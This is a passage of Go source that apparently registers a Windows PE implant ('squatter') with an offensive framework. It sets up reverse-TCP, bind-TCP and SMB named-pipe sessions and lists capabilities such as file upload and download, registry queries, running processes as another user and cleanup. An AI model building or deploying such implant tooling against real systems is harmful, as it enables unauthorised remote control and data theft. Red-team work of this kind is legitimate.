			out[key] = text
		}
	}
	return out
}

func payloadInfo(transport string) hovel.PayloadInfo {
	transport = canonicalTransport(transport)
	info := hovel.PayloadInfo{
		ID:           fmt.Sprintf("squatter/%s/%s/%s/%s/%s", platform, arch, minOS, transport, formatPEEXE),
		Name:         payloadName,
		Version:      version,
		Kind:         string(hovel.PayloadKindPE),
		Platform:     platform,
		OS:           platform,
		Arch:         arch,
		MinOS:        minOS,
		TestedOS:     []string{minOS},
		Formats:      []string{formatPEEXE, hovel.PayloadFormatPE},
		Tags:         []string{"pe", "windows", "agent", "squatter"},
		Capabilities: capabilities(),
		Transport: hovel.PayloadTransport{
			Kind:      transport,
			Encrypted: false,
		},
		Session: hovel.PayloadSession{
			Kind:  "agent",
			Owner: "payload_provider",
		},
	}
	switch transport {
	case tcpCallback:
		info.Session.Acquisition = "callback"
		info.Session.RequiresPreThrowListener = true
	case tcpBind:
		info.Session.Acquisition = "post_throw_connect"
		info.Session.RequiresPostThrowConnect = true
	case smbNamedPipe:
		info.Session.Acquisition = "post_throw_connect"
		info.Session.RequiresPostThrowConnect = true
	}
	return info
}

func matchingPayloadInfo(query hovel.PayloadQuery, transport string) (hovel.PayloadInfo, bool) {
	info := payloadInfo(canonicalTransport(transport))
	if query.Kind != "" && query.Kind != info.Kind {
		return hovel.PayloadInfo{}, false
	}
	if query.OS != "" && query.OS != info.OS {
		return hovel.PayloadInfo{}, false
	}
	if query.Platform != "" && query.Platform != info.Platform {
		return hovel.PayloadInfo{}, false
	}
	if query.Arch != "" && query.Arch != info.Arch {
		return hovel.PayloadInfo{}, false
	}
	if query.Format != "" && !slices.Contains(info.Formats, query.Format) {
		return hovel.PayloadInfo{}, false
	}
	for _, tag := range query.Tags {
		if !slices.Contains(info.Tags, tag) {
			return hovel.PayloadInfo{}, false
		}
	}
	return info, true
}

func canonicalTransport(transport string) string {
	if transport == reverseTCP {
		return tcpCallback
	}
	return transport
}

func capabilities() []string {
	return []string{
		"host.info",
		"file.get",
		"file.put",
		"file.stat",
		"file.hash",
		"registry.query",
		"eventlog.query",
		"drive.list",
		"share.list",
		"acl.stat",
		"process.exec",
		"process.exec.as_user",
		"process.run",
		"process.list",
		"process.tasklist",
		"process.kill",
		"payload.status",
		"payload.cleanup",
	}
}

func logProviderError(action string, err error) {
	if err != nil {
		log.Printf("squatter provider: %s: %v", action, err)
	}
}
